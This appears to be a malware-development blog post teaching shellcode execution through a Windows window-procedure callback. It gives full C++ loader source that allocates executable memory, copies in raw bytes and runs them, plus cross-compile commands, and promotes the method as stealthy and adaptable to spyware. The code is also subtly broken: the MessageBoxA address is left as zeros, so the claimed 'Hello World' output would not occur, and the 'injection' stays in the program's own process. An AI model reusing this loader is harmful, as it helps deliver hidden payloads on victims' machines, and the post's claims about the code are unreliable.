# Malware Development Part 14: Shellcode Injection via Window Callbacks-

Shellcode injection is a potent technique in security research and exploit development, enabling the execution of arbitrary machine code within a target process. This post focuses on **shellcode injection via window callbacks**, a method that leverages the Windows messaging system to execute shellcode through the `WndProc` function.

---

## Introduction to Shellcode Injection

**Shellcode** is a small, position-independent sequence of machine instructions that performs specific tasks such as spawning shells, displaying messages, or establishing connections. It is a fundamental element in many exploits.

Shellcode injection typically involves:

1. Injecting shellcode into the memory of a process.
2. Redirecting code execution to the shellcode’s location.

Common techniques include thread injection, function pointer manipulation, and callback exploitation. This article focuses on **window callbacks**, a technique rooted in the Windows GUI subsystem.

---

## Understanding Window Callbacks

### What is a Callback?

A **callback** is a function registered to handle specific events or actions. In Windows programming, callbacks manage GUI events, such as mouse clicks or key presses.

### Window Procedure (`WndProc`)

The `WndProc` is a user-defined function for handling messages sent to a window:

```cpp
LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
```

Parameters:
- `hwnd`: Handle to the window.
- `msg`: Message identifier.
- `wParam`, `lParam`: Additional message information.

### Windows Messaging System

Windows uses a **message queue** for GUI threads, which is processed in a loop using `GetMessage` and `DispatchMessage`. The system calls `WndProc` when dispatching messages, making it a suitable target for injection.

---

## Shellcode Injection via Window Callbacks

### Concept

This technique involves:
1. Creating a window with a custom `WndProc`.
2. Allocating executable memory for shellcode.
3. Copying the shellcode into memory.
4. Modifying `WndProc` to run shellcode on a specific message.
5. Triggering the message to execute the code.

### Why Use Window Callbacks?

- **Reliability**: The OS ensures `WndProc` is invoked for relevant messages.
- **Legitimacy**: GUI callbacks are typical and less suspicious.
- **Simplicity**: Easy to implement and control.

---

## Proof-of-Concept (POC) Code

This C++ code uses a basic 64-bit shellcode that shows a MessageBox. It includes memory allocation, execution, and cleanup.

```cpp
#include <windows.h>

// Simple shellcode to display a MessageBox (64-bit)
unsigned char shellcode[] = {
    0x48, 0x83, 0xEC, 0x28,
    0x48, 0x31, 0xC9,
    0x48, 0x8D, 0x15, 0x1E, 0x00, 0x00, 0x00,
    0x4C, 0x8D, 0x05, 0x1F, 0x00, 0x00, 0x00,
    0x48, 0x31, 0xC9,
    0x48, 0xB8, /* MessageBoxA address placeholder */ 0,0,0,0,0,0,0,0,
    0xFF, 0xD0,
    0x48, 0x83, 0xC4, 0x28,
    0xC3,
    'H','e','l','l','o',' ','W','o','r','l','d',0,
    'T','e','s','t',0
};

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static LPVOID shellcodeAddr = NULL;
    if (msg == WM_USER + 100) {
        shellcodeAddr = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!shellcodeAddr) {
            MessageBoxW(hwnd, L"Failed to allocate memory", L"Error", MB_OK | MB_ICONERROR);
            return 0;
        }
        memcpy(shellcodeAddr, shellcode, sizeof(shellcode));
        ((void(*)())shellcodeAddr)();
        VirtualFree(shellcodeAddr, 0, MEM_RELEASE);
        shellcodeAddr = NULL;
        return 0;
    }
    if (msg == WM_DESTROY) {
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProcW(hwnd, msg, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    WNDCLASSW wc = { 0 };
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = L"InjectWindow";

    if (!RegisterClassW(&wc)) {
        MessageBoxW(NULL, L"Failed to register window class", L"Error", MB_OK | MB_ICONERROR);
        return 1;
    }

    HWND hwnd = CreateWindowExW(0, L"InjectWindow", L"Shellcode Demo", WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 400, 300, NULL, NULL, hInstance, NULL);

    if (!hwnd) {
        MessageBoxW(NULL, L"Failed to create window", L"Error", MB_OK | MB_ICONERROR);
        return 1;
    }

    ShowWindow(hwnd, nCmdShow);
    UpdateWindow(hwnd);

    SendMessageW(hwnd, WM_USER + 100, 0, 0);

    MSG msg = { 0 };
    while (GetMessageW(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageW(&msg);
    }

    return (int)msg.wParam;
}
```

---

## Compiling Shellcode on Kali Linux

To compile the above code for Windows on Kali Linux:

### Prerequisites

```bash
sudo apt update
sudo apt install mingw-w64
```

### Compilation

```bash
x86_64-w64-mingw32-g++ -static -static-libgcc -static-libstdc++ -DUNICODE -D_UNICODE -mwindows shellcode_injection.cpp -o shellcode_injection.exe
```

Explanation:
- `-static`: Statically links libraries.
- `-DUNICODE`: Enables Unicode support.
- `-mwindows`: GUI subsystem (no console).
- `shellcode_injection.cpp`: Your source file.

Transfer the `.exe` to a 64-bit Windows environment and execute.

> Note : Ensure the shellcode is 64-bit (as provided) for compatibility.
> Test in a Windows VM, as Kali cannot run the .exe natively.
> Use -g for debugging symbols if needed: -g -fdiagnostics-color=always.

---

## POC(Test in VS Code)
![image](https://github.com/user-attachments/assets/87adf252-6d12-4c16-89e4-dc3cb761faaa)


## How It Works

1. **Initialization**: Registers a window class and creates a window.
2. **Display**: Shows a window titled “Shellcode Demo”.
3. **Trigger**: Sends a message (`WM_USER + 100`) to execute shellcode.
4. **Execution**:
   - Allocates executable memory.
   - Copies shellcode.
   - Executes it.
   - Frees the memory.
5. **Loop**: Processes messages.
6. **Output**: MessageBox with "Hello World" and title "Test".

---

## Security Implications

### Malicious Use

- **Malware**: Can be adapted to run spyware or other payloads.
- **Exploitation**: Effective in GUI-based processes.
- **Red Teaming**: Demonstrates post-exploitation techniques.

### Why Effective?

- **Stealthy**: Mimics GUI message handling.
- **Controlled**: Triggered by specific messages.
- **Simple**: Requires minimal code.

---

## Conclusion

Shellcode injection via window callbacks is a reliable and stealthy method for arbitrary code execution in Windows environments. The POC offers a practical introduction to shellcode behavior, memory management, and Windows internals. Always use responsibly in controlled labs or for red teaming.

Thank you for reading!

— **Malforge Group**

